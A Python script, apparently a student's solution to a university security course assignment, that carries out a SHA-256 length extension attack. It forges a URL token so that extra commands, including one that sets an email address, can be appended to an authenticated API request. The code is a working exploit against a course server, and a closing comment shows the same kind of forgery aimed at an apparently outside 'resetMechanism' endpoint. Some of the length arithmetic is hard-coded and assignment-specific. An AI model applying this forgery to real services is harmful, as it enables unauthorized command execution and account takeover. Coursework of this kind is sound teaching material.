#!/usr/bin/env python3

# Run me like this:
# $ python3 len_ext_attack.py "https://project1.eecs388.org/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger

import sys
from urllib.parse import quote
from pysha256 import sha256, padding


class URL:
    def __init__(self, url: str):
        # prefix is the slice of the URL from "https://" to "token=", inclusive.
        self.prefix = url[:url.find('=') + 1]
        self.token = url[url.find('=') + 1:url.find('&')]
        # suffix starts at the first "command=" and goes to the end of the URL
        self.suffix = url[url.find('&') + 1:]

    def __str__(self) -> str:
        return f'{self.prefix}{self.token}&{self.suffix}'

    def __repr__(self) -> str:
        return f'{type(self).__name__}({str(self).__repr__()})'


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    url = URL(sys.argv[1])

    # url1 = URL("https://project1.eecs388.org/aaaronx/lengthextension/api?token=69906854f52c3bdfa7e3486ab5e9e602fbbdfddab5ba0e59020dc8b2b4f10049&command=SprinklersPowerOn")
    # url2 = URL("https://project1.eecs388.org/aaaronx/lengthextension/api?token=62e810fce5ac8babb3592595c303fc2596160ffccc252d935bc4612e2a54ffbf&command=ClockPowerOff&command=NoOp&command=ClockPowerOn")

    # print(url.prefix)
    # print(url.token)
    # print(url.suffix)

    state = bytes.fromhex(url.token)
    length = 8 + len(url.suffix) - 9 + 2
    m_padding = padding(length)
    encoded = quote(m_padding)
    padded_message_len = length + len(m_padding)
    h = sha256(state=state, count=padded_message_len)

    command = "~email=aaaronx@umich.edu80".encode()
    h.update(command)

    url.token = h.hexdigest()
    url.suffix += '13' + encoded + '~email=aaaronx@umich.edu'
    

    print(url)


if __name__ == '__main__':
    main()

# python3 p5.py "https://inlichtingendienst.be/resetMechanism?token=0a45f5e284bf931e69b0c19674633360104b6a0d328ed381ae6295776c5c36d8&commands=email=hoffcar"